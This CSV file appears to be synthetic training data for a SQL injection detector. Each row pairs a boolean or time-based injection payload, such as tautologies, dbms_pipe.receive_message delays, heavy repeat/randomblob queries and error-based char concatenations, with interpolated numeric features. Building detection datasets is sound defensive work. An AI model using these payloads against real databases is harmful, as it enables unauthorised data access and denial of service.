id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000423,attack,boolean,"1 where 5485  =  5485 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000005,1.4045744353494385,255.95495183497036,36.522524082514835,3.809174460774602,73.37388245383158,42.01349713359426,100.0,40.5675722475445,0.28697179879623214,0.16363391562174953,0.39073294291363553,0.1586613426683828,0.0,0.0,2.0,0.0,0.2387379587425832,2.0,0.0,21.522524082514835,0.0,1.7612620412574167,4.2387379587425835,13.045048165029666,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.11936897937129161,0.8806310206287085,0.4774759174851666,0.0,1.0,0.11936897937129162,0.11936897937129165,0.8806310206287082,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.11936897937129161,0.0,0.0,0.0,6.164417144400959,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.880631020628709
SMOTE_000424,attack,boolean,"1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000031,1.506115034952194,123.01114142980629,36.29641147084247,3.9511432340278754,37.53465479049708,23.264542037796968,45.32828090388798,16.88366369762427,0.2906707295918584,0.20694104483083917,0.3634214623208463,0.13896676325645607,2.206373886609101,0.2645420377969663,2.264542037796966,0.7354579622030337,0.0,2.0,0.0,7.412747773218202,0.0,0.2645420377969663,1.0,5.735457962203034,0.7354579622030337,0.2645420377969663,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.7354579622030337,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7354579622030335
SMOTE_000425,attack,boolean,"1""  )   as jidc where 6093  =  6093 and 9198  =  9198--",nearest_attack_euclidean,R000023,1.5011589424275922,52.865610300476405,20.22134191706367,3.6376675227752227,11.509878683889134,18.067194849761798,17.288536766825466,6.0,0.214814390874669,0.34433407852645637,0.32700873349418386,0.11384279710469074,0.0,0.6442683834127343,2.3557316165872657,0.0,0.0,2.0,0.0,1.0,0.0,0.0,-2.220446049250313e-16,4.355731616587265,0.0,0.6442683834127343,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.6442683834127343,0.3557316165872657,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000426,attack,boolean,"1""  )   as jidc where 6093  =  6093 and 9198  =  9198--",nearest_attack_euclidean,R000023,0.4250020557788828,62.94216277481479,23.156625646817687,3.75728954490787,18.780719340179772,16.92289162354549,20.390359670089886,6.848192140999636,0.2720079729415973,0.29306585409932684,0.32595061586976726,0.10897555708930855,0.0,1.0,2.0,0.0,0.07710837645451246,2.0,0.0,1.3855418822725607,0.0,0.0,0.1542167529090248,4.077108376454513,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0771083764545123,0.0,1.0,0.07710837645451243,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.154216752909025
SMOTE_000427,attack,boolean,"1""  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000016,2.590180890493556,144.32496661620704,31.225011127930987,4.067595184677087,71.32496661620704,12.900044511723946,42.549977744138026,17.549977744138026,0.4939913667197904,0.08996035662378606,0.2946694522460559,0.12137882441036768,0.0,2.16248330810352,1.2250111279309865,0.0,1.0,2.0,0.0,5.3874944360345065,0.7749888720690137,0.0,2.0,4.225011127930986,0.0,1.0,0.6125055639654933,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.6125055639654933,1.0,0.7749888720690137,0.6125055639654933,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000428,attack,boolean,"1 where 5485  =  5485 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000005,1.5444952047882456,255.0,36.684402833354554,3.8054231329453616,77.89358299987268,34.47522266683643,100.0,42.63119433329089,0.3054650313720497,0.13519695163465267,0.39215686274509803,0.16718115424819957,1.2623886665817865,0.0,1.3688056667091066,0.0,0.0,2.0,0.0,22.0,0.0,2.0,4.0,13.368805666709108,0.3155971666454467,0.0,0.6844028333545533,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.6844028333545533,0.0,0.3155971666454467,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
SMOTE_000429,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000012,0.5104123355452928,177.88338685995103,36.0,3.931693308750127,54.521666582281405,24.568010739077646,67.20327946917459,31.59043006941741,0.3056159490188089,0.13954772454542996,0.3769490564576194,0.17788726997814178,4.0,0.0,0.0,0.0,0.0,2.0,0.0,13.136021478155293,0.0,2.0,1.3408064434465876,10.227204295631058,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.8863978521844706,0.0,0.8863978521844706,0.0,0.11360214781552935,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7952150347087048,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.681612886893176
SMOTE_000430,attack,boolean,-9148  )   where 2027  =  2027 or 8571  =  8571--,nearest_attack_euclidean,R000007,0.488657021322044,49.694786197138455,17.578988497615377,3.513965081350027,7.810583896661527,19.652606901430772,16.23159539904615,6.0,0.15579039241426557,0.39669091437007004,0.3266165474579021,0.12090214575776226,0.0,0.11579769952307561,2.8842023004769244,0.0,0.0,2.0,0.0,1.0,0.0,0.0,-2.220446049250313e-16,4.884202300476924,0.0,0.1157976995230756,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.11579769952307561,0.8842023004769244,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000431,attack,boolean,"-1772   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   8904  =  8904",nearest_attack_euclidean,R000029,1.5533301460264397,390.3767096318893,31.0,3.2912005726311175,97.39038668700387,53.8561940492175,185.0,54.13012889566795,0.24946449014711725,0.13797669696731094,0.4739019523778639,0.13865686050770784,1.5068385275572735,0.0,0.6232903681106816,0.0,0.0,3.0,0.0,38.0,0.0,0.0,1.0,13.623290368110682,0.37670963188931833,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,1.3767096318893184,0.6232903681106816,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,19.0
SMOTE_000432,attack,boolean,"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'wzrj'  =  'wzrj",nearest_attack_euclidean,R000024,1.803329746629317,381.98091249847755,33.57688214329213,3.4113286954128776,107.12301142926742,43.90774142804944,175.72322428414833,55.22693535701236,0.28168240094184005,0.11456380938345131,0.45907434037532435,0.14467944929938426,4.0,0.0,0.0,0.0,0.0,2.4846235713415736,0.0,36.45387071402472,0.0,0.5153764286584264,1.7730646429876395,12.484623571341574,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.2576882143292132,1.742311785670787,0.0,0.0,0.25768821432921324,1.7423117856707868,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7423117856707868,0.0,0.0,0.0,0.0,10.711558928353934,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,17.196182499695507
SMOTE_000433,attack,boolean,"1 where 5485  =  5485 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000005,0.1211727963783127,255.0,36.975239941766766,3.8092498615943042,76.14856034939942,36.80191953413412,100.0,42.04952011646647,0.2986218052917624,0.14432125307503577,0.39215686274509803,0.1649000788881038,0.09904023293294029,0.0,1.95047988353353,0.0,0.0,2.0,0.0,22.0,0.0,2.0,4.0,13.950479883533529,0.02476005823323496,0.0,0.975239941766765,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.975239941766765,0.0,0.024760058233235127,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
SMOTE_000434,attack,boolean,"1'+  (  select 'vedi' where 2774  =  2774 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000030,3.0217266398209546,187.00182311828573,35.213539132477116,4.137050038864751,71.70831305981692,33.99137097296533,56.46706372795006,24.8350753575534,0.41352632809753853,0.1617534824036433,0.28875131769539675,0.13596887180342138,2.213539132477115,0.0,2.0,0.0,1.2621536225076282,2.0,0.0,8.407997092599167,0.0,3.689231887461858,4.524307245015256,6.0,0.7378463774923716,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.2621536225076283,0.0,2.5243072450152564,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.2621536225076283,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.7864608675228855
SMOTE_000435,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000017,1.2234446302753446,132.432089902018,29.79202074661954,3.991967872008696,66.05602766215938,10.112055324318774,41.0,15.264006915539847,0.499134279112752,0.07539024007102184,0.3101476315109325,0.1153278493052937,0.0,0.26400691553984673,2.0,0.0,1.0,1.2640069155398468,0.0,5.735993084460153,0.0,0.0,2.0,4.264006915539847,0.0,0.2640069155398468,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.2640069155398468,1.0,0.7359930844601532,0.2640069155398468,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.264006915539847
SMOTE_000436,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R000021,1.267656172108654,76.83902839050273,28.303417034301646,3.929411613685288,21.67805678100548,17.857554575195614,25.535611356201102,11.767805678100547,0.2807783188525398,0.23383645989062418,0.3322730852881303,0.15311213596870563,0.0,3.3034170343016434,1.4643886437989042,0.0,0.0,1.232194321899452,0.0,3.7678056781005473,0.0,1.0,1.0,2.696582965698356,0.0,1.0,0.23219432189945202,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.23219432189945216,0.0,0.7678056781005479,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000437,attack,boolean,"-2583""  )   where 3455  =  3455 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R000019,0.45445408927631153,78.42794550809165,27.1175181928424,3.7926347087900294,16.554327297925482,23.920177271939828,26.314859113744966,11.638581824481372,0.20251381090403936,0.3155447633010209,0.33252832246275943,0.1494131033321803,0.23946818418051397,0.9201772719398287,2.9201772719398287,0.07982272806017136,0.0,2.0,0.0,3.478936368361028,0.0,0.9201772719398287,1.0,5.079822728060171,0.07982272806017138,0.9201772719398287,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.07982272806017132,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0798227280601713
SMOTE_000438,attack,boolean,"1%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000006,0.061117834530219524,250.00001130539098,37.03738360020153,3.770174398936085,74.42056550226724,29.056075400302298,100.45794910246876,46.06542130035268,0.297535309479103,0.1162962236227938,0.4017646788950817,0.18440378800302143,4.0,0.0,0.0,0.0,0.0,1.990654099949617,0.0,22.093459000503827,1.981308199899234,2.0,4.0,11.990654099949618,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.00934590005038305,0.0,0.0,0.009345900050382994,1.0,0.990654099949617,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.00934590005038298,0.00934590005038298,9.028037700151149
SMOTE_000439,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000012,0.373578187129873,175.233794108638,36.0,3.9363411328247366,53.57755882031929,24.415735293599884,66.07644117263915,31.164058822079678,0.30506784272346177,0.14043493162272336,0.37642654267411724,0.1780706829796976,4.0,0.0,0.0,0.0,0.0,2.0,0.0,12.831470587199771,0.0,2.0,1.249441176159931,10.166294117439953,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.916852941280023,0.0,0.9168529412800229,0.0,0.08314705871997707,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.582029411039839,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.498882352319862
SMOTE_000440,attack,boolean,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",nearest_attack_euclidean,R000004,0.010966089547962538,254.9731904806327,36.004468253227884,3.796299861693461,81.9642539741769,29.0,100.0,44.008936506455775,0.32145969200729557,0.11373773487773292,0.39219908578528595,0.17260348732968556,4.0,0.0,0.0,0.0,0.0,2.0,0.0,22.0,0.008936506455774651,2.0,4.0,12.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
SMOTE_000441,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,2.6659352558460654,132.737470133349,28.195135807409024,3.5434887004623805,32.67359925926549,20.427775881482475,54.56665528889486,25.06943970370619,0.19650200744662635,0.18368609711932576,0.421017058828135,0.1987948366059128,4.0,0.0,0.4465280148146904,0.0,0.4465280148146905,2.0,0.0,10.641663822223716,2.0,0.5534719851853096,1.6604159555559286,6.213887940741238,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.5534719851853096,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.767359925926548,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.767359925926548
SMOTE_000442,attack,boolean,"1'+  (  select 'vedi' where 2774  =  2774 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000030,0.5587206066267548,164.99266703806512,35.85458251345442,4.232860299539309,76.83666010763531,20.95682222642691,43.859877235396524,23.339307468606368,0.47382218603261805,0.12160702351575892,0.26225952968400124,0.14231126076762168,2.854582513454414,0.0,2.0,0.0,1.0484724955151954,2.0,0.0,5.630142441697538,0.0,4.757637522424024,4.096944991030391,6.0,0.9515275044848046,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.048472495515195196,0.0,2.096944991030391,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.048472495515195196,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.145417486545586
SMOTE_000443,attack,boolean,"1'+  (  select 'vedi' where 2774  =  2774 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000030,0.8946168176413142,159.70750707846554,36.14624646076722,4.245498405758078,77.70750707846555,17.707507078465554,42.169971686137785,22.12252123539666,0.48655124922603543,0.1108570413426467,0.26412925947646193,0.1384624499548559,2.5612606176983297,0.14624646076722353,2.0,0.0,1.0,2.0,0.0,5.146246460767224,0.0,4.2687676961638825,3.7075070784655533,5.853753539232777,0.8537535392327764,0.14624646076722356,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.8537535392327764,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.853753539232777
SMOTE_000444,attack,boolean,"1%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000006,0.3795611766309248,247.92106703327602,36.92807113555173,3.76908956417781,73.85614227110347,28.85614227110347,99.56842681331041,45.64035567775867,0.29794426363646614,0.11638809050801084,0.4016138326500307,0.18405381320549224,3.7122845422069375,0.0,0.14385772889653126,0.0,0.0,1.9280711355517344,0.0,22.0,1.8561422711034687,2.0,4.0,12.071928864448266,0.9280711355517344,0.0,0.07192886444826563,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.9280711355517344,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.928071135551734
SMOTE_000445,attack,boolean,"-2583""  )   where 3455  =  3455 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R000019,1.2390364682486517,66.56237531438676,24.569416736530393,3.7545956292057348,14.0,21.49647928892819,21.854125104795585,9.211770920662989,0.21422833016154053,0.32173000760808845,0.3282326588056776,0.13580900342469338,0.0,1.0,2.642354184132598,0.0,0.0,2.0,0.0,2.2847083682651963,0.0,0.6423541841325984,0.6423541841325984,4.642354184132598,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.35764581586740163,0.6423541841325984,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000446,attack,boolean,"1""  )   as jidc where 6093  =  6093 and 9198  =  9198--",nearest_attack_euclidean,R000023,0.7685471077961584,53.907258262855194,21.089381885712662,3.678305032726087,12.725134639997727,17.546370868572403,17.635752754285072,6.0,0.2342043745899452,0.3271343255298492,0.32713757059528203,0.11152372928492349,0.0,0.8178763771425326,2.1821236228574676,0.0,0.0,2.0,0.0,1.0,0.0,0.0,-2.220446049250313e-16,4.182123622857468,0.0,0.8178763771425327,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.8178763771425326,0.18212362285746736,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000447,attack,boolean,"1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000026,1.1030935813892493,216.87913630850872,33.80071940241396,3.7148912148891076,62.93956815425435,27.53381293494264,88.27050347954113,38.13525173977057,0.28806144503114356,0.12785911997418375,0.40801825087283144,0.17606118412184124,4.0,0.0,0.0,0.0,0.0,2.0,0.0,19.067625869885283,1.4661870650573574,1.2669064674713213,3.2669064674713213,9.067625869885285,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.7330935325286785,0.26690646747132135,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.533812934942643,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.533812934942643
SMOTE_000448,attack,boolean,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",nearest_attack_euclidean,R000004,0.7217371652788707,251.77605980954684,36.0,3.790466058625081,80.46479038549847,28.692958077099696,99.07887423129908,43.53943711564954,0.31943832150023926,0.11398020069018877,0.393623377711188,0.172958100098384,3.385916154199392,0.0,0.30704192290030397,0.0,0.0,1.8464790385498482,0.0,22.0,0.0,2.0,4.0,12.153520961450152,0.8464790385498481,0.0,0.15352096145015187,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.8464790385498481,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.846479038549848
SMOTE_000449,attack,boolean,"1'+  (  select 'vedi' where 2774  =  2774 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000030,3.1441493033278327,163.59439926130372,36.0,4.117304513080272,65.86890249309995,20.695799445977787,50.884597968585226,26.145099353640752,0.4048609098405618,0.12613946148262573,0.30960436403497704,0.15939526464183537,3.4492999076629647,0.0,1.1014001846740704,0.0,0.5507000923370353,2.0,0.0,8.145099353640752,0.0,3.6521002770111046,2.6521002770111055,7.79719963065186,1.0,0.0,0.5507000923370351,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.4492999076629648,1.5507000923370353,0.0,1.0,0.5507000923370353,0.5507000923370353,0.4492999076629648,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.10140018467407
